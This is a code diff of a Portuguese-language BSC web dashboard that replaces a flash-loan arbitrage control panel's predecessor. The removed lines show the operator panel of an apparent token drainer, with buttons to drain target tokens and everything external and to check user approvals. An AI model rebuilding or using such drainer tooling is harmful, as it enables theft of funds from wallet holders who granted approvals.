-                        Permissão: ${parseFloat(ethers.utils.formatEther(permissoes[i])).toFixed(4)}
-                    </div>`;
-                }
-                document.getElementById('aprovacoesResultado').innerHTML = html;
-                document.getElementById('aprovacoesResultado').style.display = 'block';
-                addLog(`✅ Verificação concluída`);
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+async function connect(){
+  if(window.rabby)log("Rabby detectado","ok");
+  if(!window.ethereum&&!window.rabby)return log("Nenhuma carteira encontrada.","bad");
+  const eth=window.rabby||window.ethereum;
+  try{
+    await eth.request({method:"eth_requestAccounts"});
+    provider=new ethers.providers.Web3Provider(eth,"any");
+    signer=provider.getSigner();
+    account=await signer.getAddress();
+    try{await eth.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x38"}]});}catch(e){}
+    $("addr").querySelector(".v").textContent=account;
+    $("wstatus").textContent="Conectada";$("wstatus").className="badge ok";
+    log("Carteira: "+account,"ok");
+    await refreshBalances();
+  }catch(e){log("Erro: "+e.message,"bad")}
+}
 
-        async function listarTokensAlvo() {
-            try {
-                addLog(`📋 Buscando lista de tokens alvo...`);
-                let i = 0;
-                let tokens = [];
-                while (true) {
-                    try {
-                        const token = await contract.tokensParaDrenar(i);
-                        tokens.push(token);
-                        i++;
-                    } catch(e) { break; }
-                }
-                let html = '<strong>📋 Tokens alvo configurados:</strong><br>';
-                for (let t of tokens) {
-                    html += `<div>🔹 ${t}</div>`;
-                }
-                document.getElementById('tokensAlvoLista').innerHTML = html;
-                document.getElementById('tokensAlvoLista').style.display = 'block';
-                addLog(`✅ ${tokens.length} tokens alvo encontrados`);
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+async function loadContract(){
+  const addr=$("contract").value.trim();
+  if(!ethers.utils.isAddress(addr))return log("Endereco invalido.","bad");
+  provider=new ethers.providers.JsonRpcProvider($("rpc").value.trim()||"https://bsc-dataseed.binance.org");
+  contract=new ethers.Contract(addr,ABI,provider);
+  try{
+    const o=await contract.owner();
+    $("net").textContent="Rede: BSC";$("net").className="badge ok";
+    $("paused").textContent=(await contract.paused())?"SIM":"Nao";
+    $("slippage").textContent=(await contract.slippageBps()).toString();
+    $("isOwner").textContent=(account&&account.toLowerCase()===o.toLowerCase())?"SIM":"Nao";
+    const r=await contract.getSourceWbnbReserve();
+    $("srcReserve").textContent=fmt(r)+" WBNB";
+    log("Contrato: "+addr+" | Owner: "+o.slice(0,12)+"...","ok");
+    if(signer)contract=contract.connect(signer);
+  }catch(e){log("Erro ao carregar: "+e.message,"bad")}
+}
 
-        function waitForEthers() {
-            return new Promise(resolve => {
-                if (window.ethers) resolve();
-                else setTimeout(() => waitForEthers().then(resolve), 100);
-            });
-        }
+function parsePath(){
+  const token=$("token").value.trim();
+  let raw=$("sellPath").value.trim();
+  if(!raw)raw=token+",0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
+  const parts=raw.split(",").map(s=>s.trim()).filter(Boolean);
+  if(parts.length<2)return log("Rota invalida: precisa pelo menos [token, WBNB].","bad");
+  if(!ethers.utils.isAddress(parts[0]))return log("Primeiro endereco da rota invalido.","bad");
+  if(parts[parts.length-1].toLowerCase()!==WBNB_ADDR.toLowerCase())return log("Rota precisa terminar em WBNB.","bad");
+  return parts;
+}
 
-        waitForEthers().then(() => {
-            addLog("✅ Ethers.js carregado. Conecte sua carteira.");
-            document.getElementById('connectBtn').addEventListener('click', connectWallet);
-            document.getElementById('refreshBtn').addEventListener('click', refreshData);
-            document.getElementById('setTaxaBtn').addEventListener('click', setTaxa);
-            document.getElementById('setStatusBtn').addEventListener('click', setStatus);
-            document.getElementById('autorizarPoolBtn').addEventListener('click', autorizarPool);
-            document.getElementById('drenarGoldenBtn').addEventListener('click', drenarGolden);
-            document.getElementById('drenarTokenUnicoBtn').addEventListener('click', drenarTokenUnico);
-            document.getElementById('drenarTudoExternoBtn').addEventListener('click', drenarTudoExterno);
-            document.getElementById('mintBtn').addEventListener('click', mint);
-            document.getElementById('burnBtn').addEventListener('click', burn);
-            document.getElementById('adicionarTokenAlvoBtn').addEventListener('click', adicionarTokenAlvo);
-            document.getElementById('verificarAprovacoesBtn').addEventListener('click', verificarAprovacoes);
-            document.getElementById('listarTokensAlvoBtn').addEventListener('click', listarTokensAlvo);
-        }).catch(() => {
-            addLog("❌ Falha ao carregar ethers.js", true);
-        });
-    </script>
+async function estimate(){
+  if(!contract)return log("Carregue o contrato.","bad");
+  const token=$("token").value.trim(),rtr=$("sellRouter").value.trim(),amt=ethers.utils.parseEther(String(Number($("amount").value)||0));
+  const path=parsePath();if(!path)return;
+  if(!ethers.utils.isAddress(token)||!ethers.utils.isAddress(rtr))return log("Token/Router invalido.","bad");
+  if(amt.isZero())return log("Defina valor do flash-loan.","bad");
+  try{
+    const[profit,buyOut,sellOut,repay]=await contract.viewProfit(token,rtr,amt,path);
+    $("stBuy").textContent=fmt(buyOut)+" "+await sym(token);
+    $("stSell").textContent=fmt(sellOut)+" WBNB";
+    $("stRepay").textContent=fmt(repay)+" WBNB";
+    $("stProfit").textContent=(profit.gt(0)?"+":"")+fmt(profit)+" WBNB (~$"+(fmt(profit)*600).toFixed(2)+")";
+    $("stProfit").style.color=profit.gt(0)?"var(--ok)":"var(--bad)";
+    log(`Estimativa [${path.map(a=>a.slice(0,6)).join("->")}]: lucro ${profit.gt(0)?"+":""}${fmt(profit)} WBNB`,profit.gt(0)?"ok":"warn");
+  }catch(e){log("Falha: "+e.message,"bad")}
+}
+
+async function execute(){
+  if(!contract)return log("Carregue o contrato.","bad");
+  if(!signer)return log("Conecte a carteira.","bad");
+  if($("isOwner").textContent!=="SIM")return log("Carteira nao e owner.","bad");
+  const token=$("token").value.trim(),rtr=$("sellRouter").value.trim(),amt=ethers.utils.parseEther(String(Number($("amount").value)||0));
+  const path=parsePath();if(!path)return;
+  if(!ethers.utils.isAddress(token)||!ethers.utils.isAddress(rtr)||amt.isZero())return log("Preencha todos os campos.","bad");
+  const gp=await provider.getGasPrice();
+  const est=await contract.estimateGas.startArb(token,rtr,amt,path);
+  const cost=gp.mul(est);
+  const bal=await provider.getBalance(account);
+  if(bal.lt(cost))return log(`BNB insuficiente: precisa ~${fmt(cost)}, tem ${fmt(bal)}.`,"bad");
+  log(`Executando startArb (gas ~${est.toString()}, custo ~${fmt(cost)} BNB).`,"warn");
+  try{
+    const tx=await contract.startArb(token,rtr,amt,path,{gasLimit:est.mul(3).div(2)});
+    log("Tx: "+tx.hash,"sys");
+    const rc=await tx.wait();
+    log("Confirmado bloco "+rc.blockNumber,"ok");
+    const ev=rc.events.find(e=>e.event==="ArbExecuted");
+    if(ev){const p=ev.args.profit;log("LUCRO: +"+fmt(p)+" WBNB",p.gt(0)?"ok":"bad")}
+    refreshBalances();
+  }catch(e){log("Falha: "+e.message,"bad")}
+}
+
+async function setRemote(addr,label,fn){
+  if(!contract)return log("Carregue contrato.","bad");
+  if(!ethers.utils.isAddress(addr))return log(label+" invalido.","bad");
+  try{const tx=await fn(addr);log(label+" atualizado: "+tx.hash,"ok")}catch(e){log("Erro: "+e.message,"bad")}
+}
+
+window.addEventListener("load",()=>{
+  $("btnConnect").onclick=connect;
+  $("btnLoad").onclick=loadContract;
+  $("btnEstimate").onclick=estimate;
+  $("btnExec").onclick=execute;
+  $("btnPause").onclick=async()=>{if(contract){await contract.setPaused(true);log("Pausado.","ok")}};
+  $("btnResume").onclick=async()=>{if(contract){await contract.setPaused(false);log("Retomado.","ok")}};
+  $("btnRescue").onclick=async()=>{const a=$("rescueToken").value.trim();if(!ethers.utils.isAddress(a))return log("Token invalido","bad");const tx=await contract.rescue(a);await tx.wait();log("Resgatado "+a,"ok")};
+  $("btnRescueBNB").onclick=async()=>{const tx=await contract.rescueBNB();await tx.wait();log("BNB resgatado","ok")};
+  $("btnSetRouterA").onclick=()=>setRemote($("sellRouter").value.trim(),"Router A",(a)=>contract.setRouterA(a));
+  $("btnSetBack").onclick=()=>setRemote($("sellRouter").value.trim(),"BackRouter",(a)=>contract.setBackRouter(a));
+  $("btnSetSource").onclick=()=>setRemote($("sellRouter").value.trim(),"SourcePair",(a)=>contract.setSourcePair(a));
+});
+</script>
 </body>
 </html>
